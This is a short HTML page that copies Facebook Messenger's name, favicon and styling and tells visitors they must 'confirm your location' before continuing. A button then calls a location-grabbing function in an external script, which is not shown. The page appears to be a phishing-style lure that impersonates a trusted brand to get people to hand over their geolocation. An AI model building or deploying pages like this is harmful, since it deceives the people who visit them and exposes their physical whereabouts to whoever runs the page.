<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Messenger</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      background: #fff;
      border-radius: 8px;
      padding: 40px 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
    }

    .logo {
      font-size: 32px;
      font-weight: 600;
      color: #0084ff;
      margin-bottom: 16px;
      letter-spacing: -0.5px;
    }

    .message {
      font-size: 15px;
      color: #1c1e21;
      margin-bottom: 20px;
      line-height: 1.4;
    }

    .button {
      background-color: #0084ff;
      color: #fff;
      font-size: 15px;
      padding: 12px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      font-weight: 500;
    }

    .button:active {
      background-color: #006fe0;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Messenger</div>
    <div class="message">To continue, please confirm your location.</div>
    <button class="button" onclick="getCoordinates()">Proceed</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
